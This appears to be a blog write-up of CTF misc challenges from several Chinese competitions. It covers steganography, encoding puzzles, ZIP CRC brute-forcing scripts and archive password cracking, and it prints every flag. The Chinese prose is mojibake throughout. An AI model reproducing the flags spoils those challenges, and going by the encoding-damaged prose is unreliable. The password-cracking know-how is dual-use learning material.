å¯ä»¥å¾—åˆ°ä¸€ä¸ªç™¾åº¦ç½‘ç›˜åˆ†äº«é“¾æ¥ï¼ŒæŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚çœ‹äº† WriteUp æ‰çŸ¥é“è¿™é‡Œæœ¬æ¥æœ‰ä¸ª hint æ˜¯ NTFSï¼Œäºæ˜¯ä¸Š NTFS æµåˆ†æã€‚å‹ç¼©æ–‡ä»¶å¿…é¡»ä½¿ç”¨ WinRAR å»è§£å‹æ‰èƒ½æ‰¾åˆ°æ–‡ä»¶æµï¼Œå¾—åˆ°ä¸€ä¸ª pyc æ–‡ä»¶ï¼Œåç¼–è¯‘å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        s = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(s))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ciphertext[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = [<span class="string">&#x27;96&#x27;</span>,<span class="string">&#x27;65&#x27;</span>,<span class="string">&#x27;93&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;91&#x27;</span>,<span class="string">&#x27;97&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;93&#x27;</span>,<span class="string">&#x27;70&#x27;</span>,<span class="string">&#x27;102&#x27;</span>,<span class="string">&#x27;94&#x27;</span>,<span class="string">&#x27;132&#x27;</span>,<span class="string">&#x27;46&#x27;</span>,<span class="string">&#x27;112&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;97&#x27;</span>,<span class="string">&#x27;88&#x27;</span>,<span class="string">&#x27;80&#x27;</span>,<span class="string">&#x27;82&#x27;</span>,<span class="string">&#x27;137&#x27;</span>,<span class="string">&#x27;90&#x27;</span>,<span class="string">&#x27;109&#x27;</span>,<span class="string">&#x27;99&#x27;</span>,<span class="string">&#x27;112&#x27;</span>]</span><br></pre></td></tr></table></figure><p>å†™ä¸ªè§£å¯†å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    cipherText = ciphertext[::-<span class="number">1</span>]</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipherText)):</span><br><span class="line">        s = <span class="built_in">int</span>(cipherText[i]) - <span class="number">10</span> <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="built_in">int</span>(cipherText[i]) + <span class="number">10</span></span><br><span class="line">        s = <span class="built_in">chr</span>(s ^ i)</span><br><span class="line">        flag += s</span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><p>å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y@e_Cl3veR_C1Ever!&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTFæ–°ç”Ÿèµ›2020-base64éšå†™"><a href="#ACTFæ–°ç”Ÿèµ›2020-base64éšå†™" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]base64éšå†™"></a>[ACTFæ–°ç”Ÿèµ›2020]base64éšå†™</h3><p>å‹ç¼©åŒ…è§£å‹å¾—åˆ°æ–‡æœ¬æ–‡æ¡£ï¼Œä½¿ç”¨ Base64 éšå†™å·¥å…·å¯è§£å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;6aseb4_f33!&#125;</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-æ¥é¢˜ä¸­ç­‰çš„å§"><a href="#HBNIS2018-æ¥é¢˜ä¸­ç­‰çš„å§" class="headerlink" title="[HBNIS2018]æ¥é¢˜ä¸­ç­‰çš„å§"></a>[HBNIS2018]æ¥é¢˜ä¸­ç­‰çš„å§</h3><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œè½¬æ¢ä¸ºæ‘©æ–¯ç”µç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890396760/722e61db8fcbd3b076bae5701e5b6014227f83a0.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.- .-.. .--. .... .- .-.. .- -...</span><br></pre></td></tr></table></figure><p>å°†æ‘©æ–¯ç”µç è§£å‡ºå³å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ALPHALAB&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-ä¼Ÿå¤§çš„ä¾¦æ¢"><a href="#SWPU2019-ä¼Ÿå¤§çš„ä¾¦æ¢" class="headerlink" title="[SWPU2019]ä¼Ÿå¤§çš„ä¾¦æ¢"></a>[SWPU2019]ä¼Ÿå¤§çš„ä¾¦æ¢</h3><p>010 editor ä¸‹ç¼–è¾‘ä¸º EBCDIC å¯è§å‹ç¼©åŒ…å¯†ç  <code>wllm_is_the_best_team!</code>ã€‚è§£å‹å‹ç¼©åŒ…åå¯¹ç…§å°äººè·³èˆå¾—è§£å¯†è¡¨å¯å¾—flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890542432/b17c08760274eb824fcdf0dd201096a70bfda11d.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;iloveholmesandwllm&#125;</span><br></pre></td></tr></table></figure><h3 id="é»‘å®¢å¸å›½"><a href="#é»‘å®¢å¸å›½" class="headerlink" title="é»‘å®¢å¸å›½"></a>é»‘å®¢å¸å›½</h3><p>è§£å‹æ–‡ä»¶å¾—åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œé‡Œé¢æœ‰å¾ˆå¤šæ•°æ®ã€‚è§‚å¯Ÿå®¹æ˜“å¾—å‡º <code>52 61 72</code> å¯¹åº” Rarï¼Œå› æ­¤æ•°æ®æ˜¯ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œç¼–å†™è„šæœ¬å°†å…¶è¿˜åŸã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">hexData = <span class="built_in">open</span>(<span class="string">&#x27;7ecb86887bd03535a7f9959e934e901e.txt&#x27;</span>).read()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;7ecb86887bd03535a7f9959e934e901e.rar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(binascii.unhexlify(hexData))</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  3690ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890621842/2b0fa52c2b8aa8d4c7a6740297b42939ef07ae58.png"></p><p>è§£å‹å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå°†æ–‡ä»¶å¤´ä¿®æ­£åæ‰“å¼€å›¾ç‰‡å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213890949974/ea3832cc083c1ee77420bafee1f8a6e88607d355.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;57cd4cfd4e07505b98048ca106132125&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-find-me"><a href="#WUSTCTF2020-find-me" class="headerlink" title="[WUSTCTF2020]find_me"></a>[WUSTCTF2020]find_me</h3><p>è§£å‹æ‰€å¾—çš„å›¾ç‰‡çš„å±æ€§ä¸­å‘ç°ç›²æ–‡å­—ç¬¦ <code>â¡‡â¡“â¡„â¡–â ‚â €â ‚â €â¡‹â¡‰â ”â €â ”â¡…â¡¯â¡–â ”â â ”â¡â ”â¡”â ”â¡¯â¡½â ”â¡•â ”â¡•â ”â¡•â ”â¡•â ”â¡•â¡=</code>ã€‚ä½¿ç”¨<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">åŠ è§£å¯†å·¥å…·</a>è§£å¯†å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891084216/04601af69804904915e5f91c23bdde7cef99d626.png" alt="image-20210127124644280"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</span><br></pre></td></tr></table></figure><h3 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h3><p>å‹ç¼©æ–‡ä»¶å¤‡æ³¨æœ‰å†…å®¹ï¼Œå¤åˆ¶åˆ° VS Code å¯çŸ¥æ˜¯æ‘©æ–¯ç”µç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891161890/66535ac362159fbb8a63b196e44241159d5a73c4.png"></p><p>è§£å‡ºæ‘©æ–¯ç”µç å¯å¾— <code>HELL0FORUM</code>ï¼Œå°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹å‡ºå›¾ç‰‡ã€‚è¿™é‡Œéœ€è¦ä½¿ç”¨ Cloacked Pixel å»è§£å¯†å¾—å‡º flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891291723/064ec335922c07d98c5c50aed78fa26c0a41891c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;jsy09-wytg5-wius8&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"><a href="#MRCTF2020-ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—" class="headerlink" title="[MRCTF2020]ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"></a>[MRCTF2020]ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—</h3><p>å°†å‹ç¼©åŒ…æ–‡ä»¶å¤´ä¿®æ­£åå¾—åˆ°ä¸€ä¸ªæ–‡æ¡£ã€‚æ ¹æ®æ–‡æ¡£æç¤ºï¼Œå°†æ–‡æ¡£è§£å‹åè¯»å– document.xml å¯ä»¥å‘ç°éŸ³ç¬¦ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891417395/696e6424a22cbc25379a7a641a710a7f6348d514.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â™­â™¯â™ªâ€–Â¶â™¬â™­â™­â™ªâ™­â€–â€–â™­â™­â™¬â€–â™«â™ªâ€–â™©â™¬â€–â™¬â™¬â™­â™­â™«â€–â™©â™«â€–â™¬â™ªâ™­â™­â™­â€–Â¶âˆ®â€–â€–â€–â€–â™©â™¬â€–â™¬â™ªâ€–â™©â™«â™­â™­â™­â™­â™­Â§â€–â™©â™©â™­â™­â™«â™­â™­â™­â€–â™¬â™­â€–Â¶Â§â™­â™­â™¯â€–â™«âˆ®â€–â™¬Â¶â€–Â¶âˆ®â€–â™¬â™«â€–â™«â™¬â€–â™«â™«Â§&#x3D;</span><br></pre></td></tr></table></figure><p>å°†å…¶æ”¾åˆ°å¯¹åº”çš„<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">åŠ è§£å¯†å·¥å…·</a>é‡Œè§£å¯†å³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891559031/1e73cf2b04da2c27c935a79437dd4ea9b277ee40.png" alt="image-20210127132118790"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;</span><br></pre></td></tr></table></figure><h3 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h3><p>ä½¿ç”¨ Wireshark åˆ†ææµé‡åŒ…ï¼Œç­›é€‰ http æ¡ç›®ï¼Œå¯ä»¥å¯¼å‡ºå¾ˆå¤šå›¾ç‰‡ã€‚ä½¿ç”¨ StegSolve è§£éšå†™å¯ä»¥å‘ç°ä¸€å¼ å›¾ç‰‡ä¸­å‡ºç°äº†ä¸€æ¡çº¿ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891691942/e5f986d447dd02059cf0363774c4d6082ce38cf6.png"></p><p>å¯¹åº”å¦å¤–ä¸€å¼ å›¾çš„æš—ç¤ºï¼Œå°†çº¿æ¡è¡¥é½è·å¾—æ——å¸œï¼ˆflag)ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891801816/bca90781c8f1046c47b49551a8c31f01164df41c.png"></p><p>äºæ˜¯ä½¿ç”¨ StegSolve å°†è¿™ä¸ªä¸¤ä¸ªå›¾ç‰‡ Combine åœ¨ä¸€èµ·åˆ†æï¼Œå¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213891967002/855d16387156ff390a2bfdf3ccf497d10369e59e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;J0hn_th3_Sn1ff3r&#125;</span><br></pre></td></tr></table></figure><h3 id="SWPU2019-ä½ æœ‰æ²¡æœ‰å¥½å¥½çœ‹ç½‘è¯¾"><a href="#SWPU2019-ä½ æœ‰æ²¡æœ‰å¥½å¥½çœ‹ç½‘è¯¾" class="headerlink" title="[SWPU2019]ä½ æœ‰æ²¡æœ‰å¥½å¥½çœ‹ç½‘è¯¾?"></a>[SWPU2019]ä½ æœ‰æ²¡æœ‰å¥½å¥½çœ‹ç½‘è¯¾?</h3><p>è§£å‹å¾—åˆ°å¾ˆå¤šæ–‡ä»¶ï¼Œé¦–å…ˆæ ¹æ®å‹ç¼©åŒ…å¤‡æ³¨å¯¹ flag3.zip ä½¿ç”¨ ARCHPR çˆ†ç ´å¾—åˆ°å¯†ç  183792ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892047610/3b8624b7f56df7ead120b23d0ae94787a35a185e.png"></p><p>è§£å‹å¾—åˆ°ä¸€ä¸ªè§†é¢‘ï¼Œåœ¨ Premiere ä¸‹æ‰“å¼€é€å¸§æ’­æ”¾å¯ä»¥å¾—åˆ°ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892143671/6ccb2ffe24c5d72a9f23d566f4d6f527a437d059.png"><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892226254/a7f7b56d2bc93d2879c77e56fae2efe4f14b1fcf.png"></p><p>å…¶ä¸­ç¬¬ä¸€æ®µæ˜¯ Tap Codeï¼Œä½¿ç”¨å¯¹åº”çš„ç è¡¨å¯è§£å‡ºä¸º <code>wllm</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  1  2  3  4  5</span><br><span class="line">1 A  B C/K D  E</span><br><span class="line">2 F  G  H  I  J </span><br><span class="line">3 L  M  N  O  P</span><br><span class="line">4 Q  R  S  T  U</span><br><span class="line">5 V  W  X  Y  Z</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ®µç›´æ¥ base64 è§£ç ä¸º <code>up_up_up</code>ã€‚å°†å…¶æ‹¼åˆå¯å¾— <code>wllmup_up_up</code>ã€‚å°†å…¶ä½œä¸ºè§£å‹å¯†ç è§£å‹ flag2.zipï¼Œå¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892313246/7582d1149fe8df6578be9a115769a7d8b1bc163c.png"></p><p>ä½¿ç”¨ 010editor æ‰“å¼€å›¾ç‰‡å¯ä»¥ç›´æ¥æ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swpuctf&#123;A2e_Y0u_Ok?&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-KO"><a href="#GUET-CTF2019-KO" class="headerlink" title="[GUET-CTF2019]KO"></a>[GUET-CTF2019]KO</h3><p>å°†å¾—åˆ°çš„å†…å®¹ç›´æ¥ Ook! è§£ç å³å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;welcome to CTF&#125;</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-caesar"><a href="#HBNIS2018-caesar" class="headerlink" title="[HBNIS2018]caesar"></a>[HBNIS2018]caesar</h3><p>æ‰“å¼€ä¹‹åå¾—åˆ°ä¸€ä¸²æ–‡æœ¬ <code>gmbhjtdbftbs</code>ï¼Œä½¿ç”¨å‡¯æ’’åŠ å¯†çš„å·¥å…·è§£å¯†å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892443452/a0e3a7d348de9f4528744292d72d41680ea06913.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;flagiscaesar&#125;</span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>è§£å‹ä¹‹åå¾—åˆ°äº†å¾ˆå¤š zip æ–‡ä»¶ï¼Œæ ¹æ®æç¤ºéœ€è¦æå–å†…å®¹ï¼Œä½†æ˜¯å‹ç¼©åŒ…éœ€è¦å¯†ç ï¼Œæ–‡ä»¶å¤§å°ä¸º 4 å­—èŠ‚ï¼Œäºæ˜¯å°è¯• CRC çˆ†ç ´ã€‚å†™ä¸ªè„šæœ¬æå–å†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">base64StrDictionary = string.ascii_letters + string.digits + <span class="string">&#x27;+&#x27;</span> + <span class="string">&#x27;/&#x27;</span> + <span class="string">&#x27;=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRCZipFile</span>(<span class="params">zipPath</span>):</span></span><br><span class="line">    <span class="keyword">return</span> zipfile.ZipFile(zipPath).getinfo(<span class="string">&quot;data.txt&quot;</span>).CRC</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackData</span>(<span class="params">sampleCRC</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> base64StrDictionary:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> base64StrDictionary:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> base64StrDictionary:</span><br><span class="line">                <span class="keyword">for</span> h <span class="keyword">in</span> base64StrDictionary:</span><br><span class="line">                    data = i + j + k + h</span><br><span class="line">                    <span class="keyword">if</span> sampleCRC == (binascii.crc32(data.encode())):</span><br><span class="line">                        <span class="keyword">return</span> data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">68</span>):</span><br><span class="line">        fileName = <span class="string">&quot;b2ca8799-13d7-45df-a707-94373bf2800c\\out&#123;&#125;.zip&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data += CrackData(CRCZipFile(fileName))</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">CrackZip()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†ä¸€ä¸² base64 å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>å°†å…¶è§£ç åå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæ ¹æ®æ–‡ä»¶å°¾ <code>C4 3D 7B 00 40 07 00</code> å¯çŸ¥æ˜¯ Rar æ–‡ä»¶ï¼Œè¡¥å…¨ä¿®æ­£æ–‡ä»¶å¤´ã€‚æ‰“å¼€æ–‡ä»¶å³å¯åœ¨æ–‡ä»¶å¤‡æ³¨å¤„çœ‹åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;nev3r_enc0de_t00_sm4ll_fil3_w1th_zip&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h3><p>010 editor æ‰“å¼€æ–‡ä»¶å‘ç°æç¤º CRC Mismatchã€‚äºæ˜¯æ‰“å¼€è„šæœ¬çˆ†ç ´å›¾ç‰‡å®½é«˜ï¼Œå¾—åˆ° <code>hex: 0x1f4 0x1c8</code>ï¼Œå¯¹åº”ä¿®æ­£ä¹‹åæ‰“å¼€å›¾ç‰‡å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892564525/8a26047ec49dd56c5ab96fb2021d50818ccfd451.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;1ts_vEryyyyyy_ez!&#125;</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-ä½ä¸ªå¤´"><a href="#HBNIS2018-ä½ä¸ªå¤´" class="headerlink" title="[HBNIS2018]ä½ä¸ªå¤´"></a>[HBNIS2018]ä½ä¸ªå¤´</h3><p>è¿™æ³¢å°±è›®ç¥å¥‡çš„ï¼Œæ ¹æ®ç»™å‡ºå¯†æ–‡ <code>EWAZX RTY TGB IJN IO KL</code> ç”¨æ‰‹æŒ‡åˆ’é”®ç›˜å¯å¾—å‡º <code>CTF</code> ä¸‰ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTF&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="[GXYCTF2019]SXMgdGhpcyBiYXNlPw=="></a>[GXYCTF2019]SXMgdGhpcyBiYXNlPw==</h3><p>é¢˜ç›® base è§£ç ä¹‹åå¾—åˆ° <code>Is this base?</code> çš„ä¿¡æ¯ã€‚æ„Ÿè§‰åœ¨æš—ç¤º base64 éšå†™ï¼Œæ‹¿å‡ºè„šæœ¬è·‘ä¸€ä¸‹å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXY&#123;fazhazhenhaoting&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTFæ–°ç”Ÿèµ›2020-NTFSæ•°æ®æµ"><a href="#ACTFæ–°ç”Ÿèµ›2020-NTFSæ•°æ®æµ" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]NTFSæ•°æ®æµ"></a>[ACTFæ–°ç”Ÿèµ›2020]NTFSæ•°æ®æµ</h3><p>ä½¿ç”¨ NTFSStreamEditor2 æ‰«æï¼Œå¾—å‡º flag æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213892828670/d6cb6a85efede3e939fdd5b5d4b68b5b8c68cad5.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;AAAds_nntfs_ffunn?&#125; </span><br></pre></td></tr></table></figure><h3 id="RoarCTF2019-é»„é‡‘6å¹´"><a href="#RoarCTF2019-é»„é‡‘6å¹´" class="headerlink" title="[RoarCTF2019]é»„é‡‘6å¹´"></a>[RoarCTF2019]é»„é‡‘6å¹´</h3><p>010 editor æ‰“å¼€è§†é¢‘æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶æœ€åå¯ä»¥æ‰¾åˆ°ä¸€ä¸² base64 å­—ç¬¦ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQAD</span><br><span class="line">Dx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEf</span><br><span 